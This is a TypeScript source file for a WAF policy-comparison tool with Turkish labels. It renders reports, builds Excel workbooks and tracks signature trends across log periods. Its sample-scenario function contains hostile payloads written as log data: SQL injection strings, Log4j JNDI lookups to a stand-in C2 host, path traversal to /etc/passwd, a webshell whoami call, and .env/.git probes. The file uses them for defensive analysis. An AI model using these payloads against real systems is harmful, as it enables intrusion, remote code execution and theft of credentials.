        ? `<p><strong>Gerçek Loglanan Trafik:</strong> Sonraki dönemde BLOCK aksiyonu uygulanan log kayıtlarına ait gözlenen trafik hacmi: <strong>${res.preventedTrafficMb} MB</strong>.</p>`
        : '<p style="color:#64748b;"><em>Log kaynağında byte bilgisi bulunmadığından trafik hacmi hesaplanamadı.</em></p>'
    }
  </div>

  <!-- BÖLÜM 6: POLICY / RULE / TARGET DETAYI -->
  <h2>6. 🗂️ Hiyerarşik Dağılım (Policy ➔ Kural/İmza ➔ Hedef Sunucu)</h2>
  <table>
    <thead>
      <tr>
        <th>Hiyerarşi Seviyesi</th>
        <th>Kimlik / Hedef</th>
        <th>Önceki Dönem (Alert)</th>
        <th>Sonraki Dönem (WAF BLOCK)</th>
      </tr>
    </thead>
    <tbody>
      ${res.signatureImpacts
        .map(
          (sig) => `
        <tr style="background:#f1f5f9; font-weight:700;">
          <td colspan="2">🛡️ Policy: ${esc(sig.policyId)} • ${esc(sig.name)} (${esc(sig.signatureId)})</td>
          <td style="color:#dc2626;">${num(sig.periodA_alerted)} Alert</td>
          <td style="color:#16a34a;">${num(sig.periodB_blocked)} Block</td>
        </tr>
        ${
          sig.targetHosts && sig.targetHosts.length > 0
            ? sig.targetHosts
                .map(
                  (t) => `
          <tr>
            <td style="padding-left:1.75rem; color:#94a3b8; font-size:0.75rem;">└─ Hedef Host</td>
            <td><strong>${esc(t.host)}</strong></td>
            <td style="color:#dc2626;">${num(t.beforeAlert)} Alert</td>
            <td style="color:#16a34a; font-weight:700;">${num(t.afterBlock)} Block</td>
          </tr>
        `
                )
                .join('')
            : '<tr><td colspan="4" style="padding-left:1.75rem; color:#94a3b8;">Hedef host ayrımı tespit edilemedi</td></tr>'
        }
      `
        )
        .join('')}
    </tbody>
  </table>

  <!-- BÖLÜM 7: ÖNERİLEN GÜVENLİK AKSİYONLARI -->
  <h2>7. 🛡️ Önerilen Güvenlik Aksiyonları</h2>
  <div class="findings-box" style="background:#f0fdf4; border-color:#bbf7d0;">
    <h3 style="font-size:0.95rem; font-weight:700; margin-bottom:0.5rem; color:#166534;">✅ SOC &amp; Network Ekipleri İçin Tavsiyeler</h3>
    <ul style="color:#14532d;">
      ${res.recommendations.map((r) => `<li>${esc(r)}</li>`).join('')}
    </ul>
  </div>
</div>
</body>
</html>`;
}

export function loadSampleWafComparisonScenario(): {
  periodAFiles: FileInput[];
  periodBFiles: FileInput[];
  periodALabel: string;
  periodBLabel: string;
} {
  // Realistic WAF scenario with Policy, Rule, Signature, Action, Host, Bytes
  const periodAContent = `date=2026-08-10 time=10:14:01 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=198.51.100.44 dst=10.0.0.80 dst_port=443 action="Alert" http_method="GET" http_url="/api/login?user=admin' OR '1'='1" status=500 bytes=4200 attack="SQL Injection" signature_id="OWASP-942-SQLI" host="srv-prod-web01"
date=2026-08-10 time=10:14:15 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=198.51.100.44 dst=10.0.0.80 dst_port=443 action="Alert" http_method="GET" http_url="/api/login?user=admin' UNION SELECT 1,password,3 FROM users--" status=500 bytes=8500 attack="SQL Injection" signature_id="OWASP-942-SQLI" host="srv-prod-web01"
date=2026-08-11 time=14:22:05 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=203.0.113.88 dst=10.0.0.80 dst_port=443 action="Alert" http_method="POST" http_url="/login" user_agent="\${jndi:ldap://evil-log4j-c2.com:1389/Exploit}" status=200 bytes=12400 attack="Log4j JNDI Remote Code Execution" signature_id="WAF-060140003" host="srv-prod-web01"
date=2026-08-11 time=14:25:30 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=203.0.113.88 dst=10.0.0.80 dst_port=443 action="Alert" http_method="POST" http_url="/api/search" user_agent="\${jndi:rmi://45.33.32.156:1099/Object}" status=200 bytes=9800 attack="Log4j JNDI Remote Code Execution" signature_id="WAF-060140003" host="srv-prod-web01"
date=2026-08-12 time=08:11:12 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=185.220.101.5 dst=10.0.0.82 dst_port=443 action="Alert" http_method="GET" http_url="/downloads/file.php?file=../../../../etc/passwd" status=200 bytes=3400 attack="Directory Traversal" signature_id="OWASP-930-TRAVERSAL" host="srv-app-portal"
date=2026-08-12 time=08:15:40 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=185.220.101.5 dst=10.0.0.82 dst_port=443 action="Alert" http_method="GET" http_url="/config.php?page=..%2f..%2fwin.ini" status=200 bytes=2800 attack="Directory Traversal" signature_id="OWASP-930-TRAVERSAL" host="srv-app-portal"
date=2026-08-15 time=16:30:10 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=91.240.118.60 dst=10.0.0.80 dst_port=443 action="Alert" http_method="POST" http_url="/uploads/cmd.aspx?c=whoami" status=200 bytes=15400 attack="Webshell Command" signature_id="WAF-WEBSHELL-CMD" host="srv-prod-web01"
date=2026-08-16 time=11:05:00 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=45.154.255.10 dst=10.0.0.80 dst_port=443 action="Alert" http_method="GET" http_url="/.env" status=200 bytes=1200 attack="Sensitive Admin Access" signature_id="SENSITIVE-ADMIN-ACCESS" host="srv-prod-web01"
date=2026-08-16 time=11:10:00 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=45.154.255.11 dst=10.0.0.80 dst_port=443 action="Alert" http_method="GET" http_url="/.git/config" status=200 bytes=1100 attack="Sensitive Admin Access" signature_id="SENSITIVE-ADMIN-ACCESS" host="srv-prod-web01"
date=2026-08-17 time=15:00:00 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=103.20.10.5 dst=10.0.0.80 dst_port=443 action="Alert" http_method="GET" http_url="/test" user_agent="sqlmap/1.6" status=200 bytes=1800 attack="Otomatize Güvenlik Tarayıcısı" signature_id="BOT-SCANNER-RECON" host="srv-prod-web01"
date=2026-08-18 time=09:12:00 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=192.168.10.15 dst=10.0.0.80 dst_port=443 action="allow" http_method="GET" http_url="/index.html" status=200 bytes=4500 attack="none" host="srv-prod-web01"
date=2026-08-18 time=09:15:00 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=192.168.10.20 dst=10.0.0.80 dst_port=443 action="allow" http_method="GET" http_url="/styles.css" status=200 bytes=1200 attack="none" host="srv-prod-web01"`;

  const periodBContent = `date=2026-09-10 time=10:14:01 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=198.51.100.44 dst=10.0.0.80 dst_port=443 action="deny" http_method="GET" http_url="/api/login?user=admin' OR '1'='1" status=403 bytes=420 attack="SQL Injection" signature_id="OWASP-942-SQLI" host="srv-prod-web01"
date=2026-09-10 time=10:14:15 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=198.51.100.44 dst=10.0.0.80 dst_port=443 action="deny" http_method="GET" http_url="/api/login?user=admin' UNION SELECT 1,password,3 FROM users--" status=403 bytes=420 attack="SQL Injection" signature_id="OWASP-942-SQLI" host="srv-prod-web01"
date=2026-09-11 time=14:22:05 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=203.0.113.88 dst=10.0.0.80 dst_port=443 action="deny" http_method="POST" http_url="/login" user_agent="\${jndi:ldap://evil-log4j-c2.com:1389/Exploit}" status=403 bytes=380 attack="Log4j JNDI Remote Code Execution" signature_id="WAF-060140003" host="srv-prod-web01"
date=2026-09-11 time=14:25:30 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=203.0.113.88 dst=10.0.0.80 dst_port=443 action="deny" http_method="POST" http_url="/api/search" user_agent="\${jndi:rmi://45.33.32.156:1099/Object}" status=403 bytes=380 attack="Log4j JNDI Remote Code Execution" signature_id="WAF-060140003" host="srv-prod-web01"
date=2026-09-12 time=08:11:12 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=185.220.101.5 dst=10.0.0.82 dst_port=443 action="deny" http_method="GET" http_url="/downloads/file.php?file=../../../../etc/passwd" status=403 bytes=410 attack="Directory Traversal" signature_id="OWASP-930-TRAVERSAL" host="srv-app-portal"
date=2026-09-12 time=08:15:40 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=185.220.101.5 dst=10.0.0.82 dst_port=443 action="deny" http_method="GET" http_url="/config.php?page=..%2f..%2fwin.ini" status=403 bytes=410 attack="Directory Traversal" signature_id="OWASP-930-TRAVERSAL" host="srv-app-portal"
date=2026-09-15 time=16:30:10 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=91.240.118.60 dst=10.0.0.80 dst_port=443 action="deny" http_method="POST" http_url="/uploads/cmd.aspx?c=whoami" status=403 bytes=420 attack="Webshell Command" signature_id="WAF-WEBSHELL-CMD" host="srv-prod-web01"
date=2026-09-16 time=11:05:00 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=45.154.255.10 dst=10.0.0.80 dst_port=443 action="deny" http_method="GET" http_url="/.env" status=403 bytes=390 attack="Sensitive Admin Access" signature_id="SENSITIVE-ADMIN-ACCESS" host="srv-prod-web01"
date=2026-09-16 time=11:10:00 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=45.154.255.12 dst=10.0.0.80 dst_port=443 action="Alert" http_method="GET" http_url="/backup.sql" status=200 bytes=1300 attack="Sensitive Admin Access" signature_id="SENSITIVE-ADMIN-ACCESS" host="srv-prod-web01"
date=2026-09-17 time=09:00:00 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=88.99.10.15 dst=10.0.0.80 dst_port=443 action="deny" http_method="GET" http_url="/api/users" rule="CORS-MISCONFIG" attack="CORS Misconfiguration" status=403 bytes=400 host="srv-prod-web01"
date=2026-09-18 time=09:12:00 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=192.168.10.15 dst=10.0.0.80 dst_port=443 action="allow" http_method="GET" http_url="/index.html" status=200 bytes=4500 attack="none" host="srv-prod-web01"
date=2026-09-18 time=09:15:00 policy="Policy-CORP-WAF" devname="FW-CORP-WAF" src=192.168.10.20 dst=10.0.0.80 dst_port=443 action="allow" http_method="GET" http_url="/styles.css" status=200 bytes=1200 attack="none" host="srv-prod-web01"`;

  return {
    periodAFiles: [{ name: 'agustos_2026_alert_donemi.log', content: periodAContent }],
    periodBFiles: [{ name: 'eylul_2026_block_donemi.log', content: periodBContent }],
    periodALabel: 'Ağustos 2026 (Alert / Kural Öncesi)',
    periodBLabel: 'Eylül 2026 (Block / Kural Sonrası)',
  };
}

export function buildPolicyComparisonWorkbook(res: PolicyComparisonResult): XLSX.WorkBook {
  const wb = XLSX.utils.book_new();

  // 1. Sheet: Yonetici_Ozeti_ve_KPI
  const summaryRows: any[][] = [
    ['WAF & GÜVENLİK POLİTİKASI DEĞİŞİKLİĞİ ETKİNLİK RAPORU'],
    ['Analiz Tarihi', res.analyzedAt],
    ['Dönem A (Referans / Öncesi)', res.periodALabel],
    ['Dönem B (Güncel / Sonrası)', res.periodBLabel],
    [
      'Action Verisi Durumu',
      res.actionDataAvailable
        ? 'EVET (Gerçek Action Kolonu Tespit Edildi)'
        : 'HAYIR (Action Kolonu Yok - Salt Gözlem Hacmi ve HTTP Status Analizi)',
    ],
    [],
    ['YÖNETİCİ ÖZETİ (EXECUTIVE BRIEFING)'],
    [res.executiveSummary],
    [],
    ['TEMEL PERFORMANS GÖSTERGELERİ (KPI)'],
    ['Metrik', 'Dönem A (Öncesi)', 'Dönem B (Sonrası)', 'Fark / Değişim', 'Açıklama'],
    [
      'Dönem Başlangıç & Bitiş Tarihleri',
      `${res.periodA.periodStart || res.periodA.startDate || '-'} → ${res.periodA.periodEnd || res.periodA.endDate || '-'}`,
      `${res.periodB.periodStart || res.periodB.startDate || '-'} → ${res.periodB.periodEnd || res.periodB.endDate || '-'}`,
      '-',
      'Start Time min/max aralığı',
    ],
    [
      'Dönem Süresi (Gün)',
      res.periodA.periodDays || res.periodA.totalDays,
      res.periodB.periodDays || res.periodB.totalDays,
      (res.periodB.periodDays || res.periodB.totalDays) - (res.periodA.periodDays || res.periodA.totalDays),
      res.periodDaysDifferent
        ? '⚠️ Dönem süreleri farklıdır; günlük ortalama dikkate alınmalıdır'
        : 'Dönem süreleri eşit',
    ],
    [
      'Toplam Gözlem Hacmi (İstek Sayısı)',
      res.periodA.totalCount ?? res.periodA.totalRequests,
      res.periodB.totalCount ?? res.periodB.totalRequests,
      (res.periodB.totalCount ?? res.periodB.totalRequests) - (res.periodA.totalCount ?? res.periodA.totalRequests),
      'SUM(Count) aggregate esasına göre hesaplandı',
    ],
    [
      'Günlük Ortalama Gözlem Sayısı (Normalize)',
      res.periodA.dailyAverageCount ?? Math.round(res.periodA.totalRequests / (res.periodA.periodDays || 1)),
      res.periodB.dailyAverageCount ?? Math.round(res.periodB.totalRequests / (res.periodB.periodDays || 1)),
      res.dailyAverageChangePct !== null ? `${res.dailyAverageChangePct >= 0 ? '+' : ''}${res.dailyAverageChangePct}%` : '-',
      'Farklı dönem sürelerinde normalize edilmiş günlük karşılaştırma',
    ],
    [
      'WAF Engelleme Oranı (%)',
      res.actionDataAvailable ? `%${res.periodA.blockRate}` : 'N/A',
      res.actionDataAvailable ? `%${res.periodB.blockRate}` : 'N/A',
      res.actionDataAvailable
        ? `${res.blockRateDelta >= 0 ? '+' : ''}${res.blockRateDelta} Yüzde Puan`
        : 'N/A',
      res.actionDataAvailable
        ? 'Gözlenen WAF Action Dağılımı'
        : 'Action kolonu bulunmadığından yapay oran üretilmedi',
    ],
    [
      'WAF BLOCK Aksiyonu Uygulanan İstekler',
      res.actionDataAvailable ? res.periodA.blockedRequests : 'N/A',
      res.actionDataAvailable ? res.periodB.blockedRequests : 'N/A',
      res.actionDataAvailable ? `+${res.attackBlockedDeltaCount}` : 'N/A',
      res.actionDataAvailable ? 'Dönem B sınırında engellenen istekler' : 'N/A',
    ],
    [
      'WAF ALERT Aksiyonu Uygulanan İstekler',
      res.actionDataAvailable ? res.periodA.alertedRequests || 0 : 'N/A',
      res.actionDataAvailable ? res.periodB.alertedRequests || 0 : 'N/A',
      res.actionDataAvailable
        ? (res.periodB.alertedRequests || 0) - (res.periodA.alertedRequests || 0)
        : 'N/A',
      res.actionDataAvailable ? 'İzleme modunda geçen istekler' : 'N/A',
    ],
    [
      'İncelenen Kural / Event Sayısı',
      res.signatureImpacts.length,
      res.signatureImpacts.length,
      '-',
      'Politika + Kural / Event kombinasyonları',
    ],
    [
      'BLOCK Aksiyonu Gözlenen İmzalar',
      '-',
      res.continuingSignatures.blockObserved.length,
      `+${res.continuingSignatures.blockObserved.length}`,
      'Sıkılaştırma etkisi gözlenenler',
    ],
    [
      'Kısmi Değişim İzlenen İmzalar (ALERT + BLOCK)',
      '-',
      res.continuingSignatures.partialChange.length,
      '-',
      'Hem alert hem block alan kurallar',
    ],
    [
      'Sonraki Dönemde Loglarda Gözlenmeyen İmzalar',
      res.notObservedSignatures.length,
      0,
      `-${res.notObservedSignatures.length}`,
      'Önceki dönemde var, sonraki dönemde loglarda yok',
    ],
    [
      'İlk Kez Görülen Yeni İmzalar',
      0,
      res.newObservedSignatures.length,
      `+${res.newObservedSignatures.length}`,
      'Önceki dönemde olmayıp sonraki dönemde ortaya çıkanlar',
    ],
    [
      'Kurtarılan Ağ Trafiği (MB)',
      '-',
      res.preventedTrafficMb !== null ? `${res.preventedTrafficMb} MB` : 'Hesaplanamadı',
      '-',
      res.preventedTrafficMb !== null
        ? 'BLOCK uygulanan log kayıtlarına ait byte hacmi'
        : 'Byte kolonu bulunamadı',
    ],
    [
      'Backend 5xx Hata Rahatlaması (%)',
      res.serverErrorReductionPct !== null ? `%${res.serverErrorReductionPct}` : 'Hesaplanamadı',
      '-',
      '-',
      res.serverErrorReductionPct !== null
        ? 'Backend uygulama telemetrisine göre'
        : 'Backend erişim logu bulunamadı',
    ],
  ];

  const wsSummary = XLSX.utils.aoa_to_sheet(summaryRows);
  XLSX.utils.book_append_sheet(wb, wsSummary, 'Yonetici_Ozeti_ve_KPI');

  // 2. Sheet: Before_After_Matrisi
  // Kolonlar: Policy, Rule / Signature / Event, Threat Type, Log Source, Before Count, After Count, Before ALERT, Before BLOCK, After ALERT, After BLOCK, Action Change, After Status, Delta, Change %, Adli Yorum
  const matrixHeaders = [
    'Policy Name',
    'Rule / Signature / Event',
    'Threat Type',
    'Log Source',
    'Before Count',
    'After Count',
    'Before ALERT',
    'Before BLOCK',
    'After ALERT',
    'After BLOCK',
    'Action Değişimi',
    'Durum (Status)',
    'Fark (Delta)',
    'Değişim (%)',
    'Adli Not / Değerlendirme',
  ];

  const matrixRows = res.signatureImpacts.map((sig) => [
    sig.policyId,
    sig.eventName || sig.name,
    sig.threatType || sig.category,
    sig.logSource || '-',
    sig.beforeCount ?? sig.periodA_total,
    sig.afterCount ?? sig.periodB_total,
    sig.actionDataAvailable ? sig.periodA_alerted : 'N/A',
    sig.actionDataAvailable ? sig.periodA_blocked : 'N/A',
    sig.actionDataAvailable ? sig.periodB_alerted : 'N/A',
    sig.actionDataAvailable ? sig.periodB_blocked : 'N/A',
    sig.actionDataAvailable ? sig.actionChangeLabel : 'N/A (Action Kolonu Yok)',
    sig.statusLabel,
    sig.delta ?? ((sig.afterCount ?? sig.periodB_total) - (sig.beforeCount ?? sig.periodA_total)),
    sig.changePct !== null ? `${sig.changePct}%` : '—',
    sig.forensicInterpretation,
  ]);

  const wsMatrix = XLSX.utils.aoa_to_sheet([matrixHeaders, ...matrixRows]);
  XLSX.utils.book_append_sheet(wb, wsMatrix, 'Before_After_Matrisi');

  // 3. Sheet: Devam_Eden_ve_Bloklananlar
  const continuingHeaders = [
    'Kategori',
    'Policy Name',
    'Rule / Event',
    'Threat Type',
    'Log Source',
    'Before Count',
    'After Count',
    'After ALERT',
    'After BLOCK',
    'Durum',
    'Teknik İnceleme Notu',
  ];
  const continuingRows: any[][] = [];

  for (const s of res.continuingSignatures.blockObserved) {
    continuingRows.push([
      res.actionDataAvailable ? 'BLOCK Gözlenen İmza' : 'Gözlem Devam Eden Olay',
      s.policyId,
      s.eventName || s.name,
      s.threatType || s.category,
      s.logSource || '-',
      s.beforeCount ?? s.periodA_total,
      s.afterCount ?? s.periodB_total,
      s.actionDataAvailable ? s.periodB_alerted : 'N/A',
      s.actionDataAvailable ? s.periodB_blocked : 'N/A',
      s.statusLabel,
      s.forensicInterpretation,
    ]);
  }
  for (const s of res.continuingSignatures.partialChange) {
    continuingRows.push([
      res.actionDataAvailable ? 'Kısmi Değişim (Alert+Block)' : 'Gözlem Devam Eden (Hacim Azalması)',
      s.policyId,
      s.eventName || s.name,
      s.threatType || s.category,
      s.logSource || '-',
      s.beforeCount ?? s.periodA_total,
      s.afterCount ?? s.periodB_total,
      s.actionDataAvailable ? s.periodB_alerted : 'N/A',
      s.actionDataAvailable ? s.periodB_blocked : 'N/A',
      s.statusLabel,
      s.forensicInterpretation,
    ]);
  }
  for (const s of res.continuingSignatures.alertContinuing) {
    continuingRows.push([
      res.actionDataAvailable ? 'ALERT Devam Eden İmza' : 'Gözlem Devam Eden (Hacim Artışı/Eşit)',
      s.policyId,
      s.eventName || s.name,
      s.threatType || s.category,
      s.logSource || '-',
      s.beforeCount ?? s.periodA_total,
      s.afterCount ?? s.periodB_total,
      s.actionDataAvailable ? s.periodB_alerted : 'N/A',
      s.actionDataAvailable ? s.periodB_blocked : 'N/A',
      s.statusLabel,
      s.forensicInterpretation,
    ]);
  }
  const wsContinuing = XLSX.utils.aoa_to_sheet([continuingHeaders, ...continuingRows]);
  const sheet3Name = res.actionDataAvailable
    ? 'Devam_Eden_ve_Bloklananlar'
    : 'Devam_Eden_ve_Action_Durumu';
  XLSX.utils.book_append_sheet(wb, wsContinuing, sheet3Name);

  // 4. Sheet: Gozlenmeyen_ve_Yeni_Olaylar
  const changesHeaders = [
    'Kategori',
    'Policy Name',
    'Rule / Event',
    'Threat Type',
    'Log Source',
    'Dönem A Gözlem Sayısı',
    'Dönem B Gözlem Sayısı',
    'Açıklama',
  ];
  const changesRows: any[][] = [];

  for (const s of res.notObservedSignatures) {
    changesRows.push([
      'After dönemindeki kaynak F5 Excel\'inde gözlenmeyen event',
      s.policyId,
      s.eventName || s.name,
      s.threatType || s.category,
      s.logSource || '-',
      s.beforeCount ?? s.periodA_total,
      0,
      'İlgili event After dönemindeki kaynak F5 Excel\'inde gözlenmemiştir.',
    ]);
  }
  for (const s of res.newObservedSignatures) {
    changesRows.push([
      'After döneminde ilk kez gözlenen event',
      s.policyId,
      s.eventName || s.name,
      s.threatType || s.category,
      s.logSource || '-',
      0,
      s.afterCount ?? s.periodB_total,
      'İlgili event After döneminde ilk kez kaynak F5 Excel\'inde gözlenmiştir.',
    ]);
  }
  const wsChanges = XLSX.utils.aoa_to_sheet([changesHeaders, ...changesRows]);
  XLSX.utils.book_append_sheet(wb, wsChanges, 'Gozlenmeyen_ve_Yeni_Olaylar');

  // 5. Sheet: Sema_ve_Dosya_Diagnostik
  const diagHeaders = [
    'Dönem',
    'Dosya Adı',
    'Dosya Tipi',
    'Format',
    'Toplam Satır',
    'Ayrıştırılan Satır',
    'Reddedilen Satır',
    'Normalize Kayıt Sayısı',
    'Toplam Gözlem Hacmi (SUM(Count))',
    'Action Kolonu Mevcut mu?',
    'Eşleşen Kolonlar',
    'Eksik Kolonlar',
    'Teşhis Notu / Uyarı',
  ];
  const diagRows: any[][] = [];

  const addDiagRows = (periodLabel: string, diags?: PeriodParsingDiagnostic[]) => {
    if (!diags) return;
    for (const d of diags) {
      diagRows.push([
        periodLabel,
        d.fileName,
        d.fileType || 'XLSX/LOG',
        d.detectedFormat,
        d.totalLines,
        d.parsedRowsCount,
        d.rejectedRowsCount || 0,
        d.normalizedRecordsCount || d.parsedRowsCount,
        d.aggregateObservationCount || d.parsedRowsCount,
        d.actionDataAvailable ? 'EVET' : 'HAYIR',
        (d.detectedColumns || []).join(', '),
        (d.unmatchedExpectedColumns || []).join(', '),
        d.warningOrError || 'Başarılı',
      ]);
    }
  };

  addDiagRows(`Dönem A (${res.periodALabel})`, res.diagnostics.periodA);
  addDiagRows(`Dönem B (${res.periodBLabel})`, res.diagnostics.periodB);

  const wsDiag = XLSX.utils.aoa_to_sheet([diagHeaders, ...diagRows]);
  XLSX.utils.book_append_sheet(wb, wsDiag, 'Sema_ve_Dosya_Diagnostik');

  return wb;
}

export function exportPolicyComparisonToExcel(res: PolicyComparisonResult, filename?: string): void {
  const wb = buildPolicyComparisonWorkbook(res);
  const name =
    filename || `WAF_Politika_Kiyaslama_Raporu_${new Date().toISOString().slice(0, 10)}.xlsx`;
  const wbout = XLSX.write(wb, { bookType: 'xlsx', type: 'array' });
  const blob = new Blob([wbout], {
    type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = name;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

/**
 * Multi-Period (3+ Log / Rapor) Karşılaştırma & Zaman Serisi Motoru
 * Her dosyayı bağımsız ayrıştırır, başlangıç tarihlerine göre kronolojik sıralar
 * ve tek bir matriste zaman içindeki seyri (trend) hesaplar.
 */
export function compareMultipleSecurityPeriods(
  periodFilesList: Array<{ label?: string; file: FileInput }>,
  options?: { policyAssumptionMode?: boolean }
): MultiPeriodComparisonResult {
  // 1. Her dönemi ayrıştır
  const parsedPeriods: Array<{
    periodId: string;
    label: string;
    fileName: string;
    parsed: ReturnType<typeof parsePeriodContent>;
    startDateMs: number;
  }> = [];

  for (let i = 0; i < periodFilesList.length; i++) {
    const item = periodFilesList[i];
    const file = item.file;
    const pLabel = item.label || file.name.replace(/\.[^/.]+$/, '');
    const forceAction = options?.policyAssumptionMode ? 'BLOCK' : undefined;
    const parsed = parsePeriodContent([file], pLabel, forceAction);

    // Tarih tespiti (sıralama için)
    let startMs = 0;
    const timeStr = parsed.metrics.periodStart || parsed.metrics.startDate;
    if (timeStr) {
      const d = new Date(timeStr.replace(/\//g, '-'));
      if (!isNaN(d.getTime())) {
        startMs = d.getTime();
      }
    }
    // Tarih yoksa orijinal liste sırasını korumak için i kullanılır
    if (startMs === 0) {
      startMs = i * 1000000;
    }

    parsedPeriods.push({
      periodId: `P${i + 1}`,
      label: pLabel,
      fileName: file.name,
      parsed,
      startDateMs: startMs,
    });
  }

  // 2. Kronolojik olarak eskiden yeniye sırala
  parsedPeriods.sort((a, b) => a.startDateMs - b.startDateMs);

  // 3. MultiPeriodEntry listesini oluştur
  const periods: MultiPeriodEntry[] = parsedPeriods.map((p, idx) => {
    const m = p.parsed.metrics;
    return {
      periodId: `P${idx + 1}`,
      label: p.label,
      fileName: p.fileName,
      periodStart: m.periodStart,
      periodEnd: m.periodEnd,
      periodDays: m.periodDays || m.totalDays || 1,
      totalRequests: m.totalRequests,
      dailyAverageCount: m.dailyAverageCount ?? parseFloat((m.totalRequests / (m.periodDays || 1)).toFixed(1)),
      blockRate: p.parsed.actionDataAvailable ? m.blockRate : null,
      blockedRequests: p.parsed.actionDataAvailable ? m.blockedRequests : undefined,
      alertedRequests: p.parsed.actionDataAvailable ? m.alertedRequests : undefined,
      eventsCount: p.parsed.logs.length,
      actionDataAvailable: p.parsed.actionDataAvailable,
    };
  });

  // 4. Tüm dönemlerdeki benzersiz Policy + Signature/Event kümesini topla
  const signatureMap = new Map<
    string,
    {
      policyId: string;
      signatureId: string;
      name: string;
      threatType: string;
      counts: Record<string, number>;
    }
  >();

  parsedPeriods.forEach((p, pIdx) => {
    const periodKey = `P${pIdx + 1}`;
    for (const l of p.parsed.logs) {
      const pol = l.policy_name || 'Default-Policy';
      const sig = l.event_name || 'Unknown-Event';
      const key = `${pol}:::${sig}`;

      if (!signatureMap.has(key)) {
        signatureMap.set(key, {
          policyId: pol,
          signatureId: sig,
          name: sig,
          threatType: l.threat_type || 'General Security',
          counts: {},
        });
      }
      const entry = signatureMap.get(key)!;
      entry.counts[periodKey] = (entry.counts[periodKey] || 0) + (l.weight || 1);
    }
  });

  // 5. Her imza için deltalari ve overall trendi belirle
  const signatures: MultiPeriodSignatureTrend[] = Array.from(signatureMap.values()).map((sig) => {
    const deltas: Record<string, number> = {};
    const counts: Record<string, number> = {};

    for (let i = 0; i < periods.length; i++) {
      const pKey = periods[i].periodId;
      const c = sig.counts[pKey] || 0;
      counts[pKey] = c;
      if (i > 0) {
        const prevKey = periods[i - 1].periodId;
        const prevC = sig.counts[prevKey] || 0;
        deltas[pKey] = c - prevC;
      }
    }

    // Trend analizi
    const firstCount = counts[periods[0].periodId] || 0;
    const lastCount = counts[periods[periods.length - 1].periodId] || 0;

    let overallTrend: 'INCREASING' | 'DECREASING' | 'STABLE' | 'DISAPPEARED' | 'NEW' = 'STABLE';
    let trendLabel = 'Durağan Seyir';

    if (firstCount === 0 && lastCount > 0) {
      overallTrend = 'NEW';
      trendLabel = 'Yeni Ortaya Çıktı';
    } else if (firstCount > 0 && lastCount === 0) {
      overallTrend = 'DISAPPEARED';
      trendLabel = 'Son Dönemde Gözlenmedi';
    } else if (lastCount < firstCount) {
      overallTrend = 'DECREASING';
      trendLabel = 'Azalış Eğiliminde (📉)';
    } else if (lastCount > firstCount) {
      overallTrend = 'INCREASING';
      trendLabel = 'Artış Eğiliminde (📈)';
    }

    return {
      policyId: sig.policyId,
      signatureId: sig.signatureId,
      name: sig.name,
      threatType: sig.threatType,
      counts,
      deltas,
      overallTrend,
      trendLabel,
    };
  });

  // Sıralama: En yüksek toplam hacme sahip imzalar üstte
  signatures.sort((a, b) => {
    const sumA = Object.values(a.counts).reduce((acc: number, v: number) => acc + (v || 0), 0);
    const sumB = Object.values(b.counts).reduce((acc: number, v: number) => acc + (v || 0), 0);
    return sumB - sumA;
  });

  // Toplam gözlem geçmişi
  const totalObservationHistory = periods.map((p) => ({
    periodLabel: p.label,
    totalRequests: p.totalRequests,
    dailyAverage: p.dailyAverageCount,
  }));

  const totalVolStart = periods[0].totalRequests;
  const totalVolEnd = periods[periods.length - 1].totalRequests;
  const volDelta = totalVolEnd - totalVolStart;
  const volPct = totalVolStart > 0 ? (((totalVolEnd - totalVolStart) / totalVolStart) * 100).toFixed(1) : '0';

  const executiveSummary = `${periods.length} adet dönem kronolojik olarak incelendi. İlk dönem (${periods[0].label}) ile son dönem (${periods[periods.length - 1].label}) arasında toplam gözlem hacmi: ${totalVolStart.toLocaleString('tr-TR')} → ${totalVolEnd.toLocaleString('tr-TR')} (${volDelta >= 0 ? '+' : ''}${volPct}%). Toplam ${signatures.length} benzersiz kural/olay takip edilmektedir.`;

  return {
    periods,
    signatures,
    totalObservationHistory,
    analyzedAt: new Date().toLocaleString('tr-TR'),
    executiveSummary,
  };
}

export function buildMultiPeriodWorkbook(res: MultiPeriodComparisonResult): XLSX.WorkBook {
  const wb = XLSX.utils.book_new();

  // Sheet 1: Donemler_ve_Hacim_Gecmisi
  const pHeaders = [
    'Dönem ID',
    'Dönem Etiketi',
    'Dosya Adı',
    'Başlangıç Tarihi',
    'Bitiş Tarihi',
    'Süre (Gün)',
    'Toplam İstek / Gözlem Hacmi (SUM Count)',
    'Günlük Ortalama İstek',
    'WAF BLOCK Oranı (%)',
    'Aksiyon Verisi Mevcut mu?',
  ];
  const pRows = res.periods.map((p) => [
    p.periodId,
    p.label,
    p.fileName,
    p.periodStart || '-',
    p.periodEnd || '-',
    p.periodDays,
    p.totalRequests,
    p.dailyAverageCount,
    p.blockRate !== null && p.blockRate !== undefined ? `%${p.blockRate}` : 'N/A',
    p.actionDataAvailable ? 'EVET' : 'HAYIR',
  ]);
  const wsP = XLSX.utils.aoa_to_sheet([pHeaders, ...pRows]);
